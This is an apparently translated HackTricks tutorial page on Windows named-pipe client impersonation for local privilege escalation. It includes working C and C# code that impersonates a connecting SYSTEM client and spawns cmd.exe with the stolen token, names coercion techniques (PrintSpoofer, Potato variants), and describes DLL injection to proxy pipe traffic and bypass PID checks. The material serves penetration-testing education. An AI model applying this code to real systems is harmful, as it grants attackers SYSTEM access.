# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation は、接続してきたクライアントのセキュリティコンテキストを named-pipe サーバースレッドが採用できるローカル権限昇格プリミティブです。実際には、SeImpersonatePrivilege を持ってコードを実行できる攻撃者が、特権を持つクライアント（例：SYSTEM サービス）を攻撃者が制御するパイプに接続させ、ImpersonateNamedPipeClient を呼び出し、得られたトークンをプライマリトークンに Duplicate して、クライアントとしてプロセスを生成する（多くの場合 NT AUTHORITY\SYSTEM）ことができます。

このページはコア技術に焦点を当てています。SYSTEM をあなたのパイプに誘導するエンドツーエンドのエクスプロイトチェーンについては、下記の Potato ファミリーページを参照してください。

## TL;DR
- Create a named pipe: \\.\pipe\<random> と作成し、接続を待つ。
- 特権を持つコンポーネントをそれに接続させる（spooler/DCOM/EFSRPC/etc.）。
- パイプから少なくとも1メッセージを読み取り、その後 ImpersonateNamedPipeClient を呼ぶ。
- 現在のスレッドからインパーソネーション・トークンを開き、DuplicateTokenEx(TokenPrimary) を行い、CreateProcessWithTokenW/CreateProcessAsUser で SYSTEM プロセスを得る。

## Requirements and key APIs
- 呼び出しプロセス／スレッドに通常必要な権限:
- SeImpersonatePrivilege — 接続してきたクライアントを正常にインパーソネートし、CreateProcessWithTokenW を使うために必要。
- 代替として、SYSTEM をインパーソネートした後に CreateProcessAsUser を使うことができ、その場合 SeAssignPrimaryTokenPrivilege と SeIncreaseQuotaPrivilege が必要になることがある（これらは SYSTEM をインパーソネートしている場合に満たされる）。
- 使用される主要な API:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile（インパーソネーション前に少なくとも1メッセージを読む必要あり）
- ImpersonateNamedPipeClient と RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW または CreateProcessAsUser
- インパーソネーションレベル: ローカルで有用な操作を行うには、クライアントが SecurityImpersonation を許可している必要がある（多くのローカル RPC/named-pipe クライアントのデフォルト）。クライアントはパイプを開く際に SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION でこれを下げることができる。

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- ImpersonateNamedPipeClient が ERROR_CANNOT_IMPERSONATE (1368) を返す場合、最初にパイプから読み取りを行い、クライアントがインパーソネーションを Identification level に制限していないことを確認してください。
- DuplicateTokenEx を SecurityImpersonation と TokenPrimary で使い、プロセス作成に適したプライマリトークンを生成することを推奨します。

## .NET の簡単な例
In .NET, NamedPipeServerStream can impersonate via RunAsClient. Once impersonating, duplicate the thread token and create a process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEMをあなたの pipe に接続させるための一般的なトリガー/強制手法
これらの手法は、特権サービスをあなたの named pipe に接続させて偽装できるように強制します:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

詳細な使用法と互換性は以下を参照：

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

サービストリガーから SYSTEM を生成するためにパイプを作成してなりすます完全な例が必要な場合は、以下を参照：

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe の IPC悪用と MITM (DLL Injection, API Hooking, PID Validation Bypass)

Named-pipe 強化されたサービスでも、信頼されたクライアントに手を入れることでハイジャック可能です。例えば [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) のようなツールはクライアントにヘルパーDLLを配置してトラフィックをプロキシし、SYSTEMサービスが処理する前に特権IPCを改ざんできるようにします。

### Inline API hooking（信頼済みプロセス内）
- 任意のクライアントにヘルパーDLLをインジェクトします（OpenProcess → CreateRemoteThread → LoadLibrary）。
- DLLはDetoursで`ReadFile`/`WriteFile`等をフックしますが、`GetFileType`が`FILE_TYPE_PIPE`を返す場合に限ります。各バッファ／メタデータを制御用パイプにコピーし、編集／破棄／リプレイを行わせた後、元のAPIを再開します。
- 正当なクライアントをBurp風のプロキシ化します: UTF-8/UTF-16/生データペイロードを一時停止したり、エラーパスをトリガーしたり、シーケンスをリプレイしたり、JSONトレースをエクスポートできます。

### Remote client mode（PIDベースの検証を回避）
- 許可リストのクライアントにインジェクトし、GUIでそのパイプとPIDを選択します。
- DLLは信頼プロセス内で`CreateFile`/`ConnectNamedPipe`を発行し、I/Oをあなたに中継するため、サーバー側からは正当なPID/イメージが観測されます。
- `GetNamedPipeClientProcessId`や署名済みイメージチェックに依存するフィルタをバイパスします。

### 高速な列挙とファジング
- `pipelist`は`\\.\pipe\*`を列挙し、ACL/SIDを表示してエントリを他のモジュールに転送し即座にプローブできます。
- pipe client/message composerは任意の名前に接続してUTF-8/UTF-16/生の16進ペイロードを生成します。キャプチャしたblobをインポートしフィールドを変異させて再送し、デシリアライザや認証されていないコマンド動詞を探索できます。
- ヘルパーDLLはループバックTCPリスナーをホストでき、tooling/fuzzersがPython SDK経由でパイプをリモート操作できます。
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
TCP ブリッジと VM スナップショットの復元を組み合わせて、脆弱な IPC パーサをクラッシュテストします。

### 運用上の考慮事項
- 名前付きパイプは低レイテンシです。バッファ編集中の長い停止は脆弱なサービスをデッドロックさせる可能性があります。
- Overlapped/completion-port I/O のカバレッジは部分的です。エッジケースが発生すると想定してください。
- Injection はノイズが大きく署名されていないため、ステルスなインプラントではなく、ラボ／exploit-dev の補助ツールとして扱ってください。

## トラブルシューティングと注意点
- ImpersonateNamedPipeClient を呼ぶ前に、パイプから少なくとも一つのメッセージを読み取る必要があります。さもなければ ERROR_CANNOT_IMPERSONATE (1368) が返ります。
- クライアントが SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION で接続している場合、サーバは完全にインパーソネートできません。GetTokenInformation(TokenImpersonationLevel) でトークンのインパーソネーション レベルを確認してください。
- CreateProcessWithTokenW は呼び出し元に SeImpersonatePrivilege を要求します。ERROR_PRIVILEGE_NOT_HELD (1314) で失敗する場合は、すでに SYSTEM をインパーソネートした後に CreateProcessAsUser を使用してください。
- パイプをハードニングする場合、ターゲットサービスが接続できるようにセキュリティ記述子を確認してください。デフォルトでは \\.\pipe 以下のパイプはサーバの DACL に従ってアクセス可能です。

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
